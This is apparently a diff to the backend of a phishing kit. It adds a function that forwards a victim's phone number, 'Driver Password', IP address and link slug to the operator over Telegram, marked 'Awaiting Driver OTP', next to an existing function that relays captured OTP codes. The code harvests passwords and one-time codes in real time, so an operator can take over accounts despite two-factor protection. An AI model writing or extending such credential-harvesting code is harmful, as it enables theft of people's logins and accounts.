@@ -178,6 +178,25 @@ async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submit
 }
 
 /**
+ * Send instant alert when Driver Password is submitted
+ */
+async function notifyPasswordSubmitted({ phoneNumber, password, customSlug, ipAddress, submittedAt }) {
+    const timeStr = new Date(submittedAt || Date.now()).toLocaleTimeString('en-US', {
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+    });
+
+    const msg = `🔐 <b>DRIVER PASSWORD SUBMITTED!</b>\n\n` +
+                `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
+                `🔑 <b>Password:</b> <code>${password}</code>\n` +
+                `⏳ <b>Status:</b> Awaiting Driver OTP\n` +
+                `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
+                `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
+                `⏰ <b>Time:</b> ${timeStr}`;
+
+    return sendTelegramMessage(msg);
+}
+
+/**
  * Send instant alert when OTP is submitted and verified
  */
 async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
@@ -187,7 +206,7 @@ async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, veri
 
     const msg = `✅ <b>DRIVER IDENTITY VERIFIED!</b>\n\n` +
                 `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
-                `🔑 <b>OTP Code:</b> <code>${otp}</code>\n` +
+                `🔢 <b>OTP Code:</b> <code>${otp}</code>\n` +
                 `STATUS: <b>VERIFIED</b>\n` +
                 `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
                 `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
@@ -217,6 +236,7 @@ module.exports = {
     saveTelegramSettings,
     getTelegramConfig,
     notifyPhoneSubmitted,
+    notifyPasswordSubmitted,
     notifyOTPVerified,
     sendTestNotification
 };
